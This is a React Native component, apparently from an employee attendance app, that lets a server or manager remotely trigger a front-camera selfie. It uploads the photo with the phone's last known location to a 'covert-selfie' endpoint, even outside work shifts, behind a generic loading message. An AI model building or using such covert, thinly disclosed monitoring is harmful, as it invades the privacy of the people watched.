import ActivityIndicator from './components/PulseLoadingIndicator';
import { getImageConfig } from './img';
/**
 * ثبت تصویر با فرمان مدیر از طریق دوربین سیستمی گوشی.
 * هیچ دوربین داخلی یا مخفی در این مسیر mount نمی‌شود.
 * به‌جای صفحهٔ سفید کامل، یک modal کوچک لودینگ نمایش داده می‌شود.
 */
import React, { useEffect, useRef, useState, useCallback } from 'react';
import { View, Text, Modal, StyleSheet } from 'react-native';
import * as Location from 'expo-location';
import { request } from './api';
import { onCovertTrigger } from './covertTrigger';
import { FONT } from './theme';

import {launchCamera,requestCameraAccess,ImagePicker} from './cameraLock';
function inHours(hours) {
  if (!hours || !Array.isArray(hours) || !hours.length) return true;
  const now = new Date();
  const cur = now.getHours() * 60 + now.getMinutes();
  return hours.some((h) => {
    const [fh, fm] = (h.from || '00:00').split(':').map(Number);
    const [th, tm] = (h.to || '23:59').split(':').map(Number);
    return cur >= fh * 60 + fm && cur <= th * 60 + tm;
  });
}

// دوربین سیستمی با امکان ثبت یا لغو توسط کاربر.
function CaptureSession({onDone}) {
  const started=useRef(false);
  useEffect(()=>{if(started.current)return;started.current=true;
    (async()=>{try{const result=await launchCamera({mediaTypes:['images'],cameraType:ImagePicker.CameraType.front,quality:getImageConfig().quality/100,base64:true});onDone(result.canceled?null:result.assets?.[0]);}catch(_){onDone(null);}})();
  },[]);
  return null;
}

export default function CovertSelfie() {
  const [perm,setPerm]=useState(null);const requestPerm=async()=>{const result=await requestCameraAccess();setPerm(result);return result;};
  const [shooting, setShooting] = useState(false);
  const busyRef = useRef(false);

  const doCapture = useCallback(async (rsn) => {
    if (busyRef.current) return;
    // دستور سرور حتی خارج از شیفت هم مجاز است، چون به‌صورت هدفمند از پنل ارسال شده است.
    let hasPerm = perm?.granted;
    if (!hasPerm) { const r = await requestPerm().catch(() => null); hasPerm = r?.granted; }
    if (!hasPerm) return;
    busyRef.current = true;
    setShooting(true);
  }, [perm]);

  const handleDone = useCallback(async (photo) => {
    setShooting(false);
    busyRef.current = false;
    if (!photo?.base64) return;
    try {
      const data = `data:image/jpeg;base64,${photo.base64}`;
      let lat = null, lng = null;
      try { const loc = await Location.getLastKnownPositionAsync({}); if (loc) { lat = loc.coords.latitude; lng = loc.coords.longitude; } } catch {}
      await request('/my/covert-selfie', { method: 'POST', body: { photo: data, lat, lng, reason: 'server_command' } });
      if (photo.uri) { try { require('expo-file-system/legacy').deleteAsync(photo.uri, { idempotent: true }); } catch {} }
    } catch {}
  }, []);

  // طبق سیاست جدید، اپ دیگر هنگام ورود، ثبت حضور یا بازه‌های دوره‌ای سلفی نمی‌گیرد.
  // گرفتن سلفی فقط با دستور صریح سرور/مدیر انجام می‌شود.
  useEffect(() => {
    let mounted = true;
    const off = onCovertTrigger(async (rsn) => {
      if (rsn === 'manual' || rsn === 'server') doCapture('manual');
    });
    const poll = async () => {
      if (!mounted) return;
      try {
        const r = await request('/my/covert-selfie-request');
        if (r?.id) {
          doCapture('manual');
                 }
      } catch {}
    };
    poll();
    const pollIv = setInterval(poll, 30000);
    return () => { mounted = false; off(); clearInterval(pollIv); };
  }, [doCapture]);

  if (!shooting) return null;
  return (
    <>
      {/* Modal لودینگ کوچک به‌جای صفحهٔ سفید */}
      <Modal transparent animationType="fade" visible={true} statusBarTranslucent>
        <View style={s.overlay}>
          <View style={s.box}>
            <ActivityIndicator color="#0d7a5f" size="large" />
            <Text style={s.txt}>چند لحظه صبر کنید…</Text>
          </View>
        </View>
      </Modal>
      <CaptureSession onDone={handleDone} />
    </>
  );
}

const s = StyleSheet.create({
  overlay: { flex: 1, backgroundColor: 'rgba(0,0,0,0.25)', alignItems: 'center', justifyContent: 'center' },
  box: { backgroundColor: '#fff', borderRadius: 14, padding: 28, alignItems: 'center', minWidth: 180, elevation: 8 },
  txt: { fontFamily: FONT.regular, color: '#333', fontSize: 13, marginTop: 14 },
});
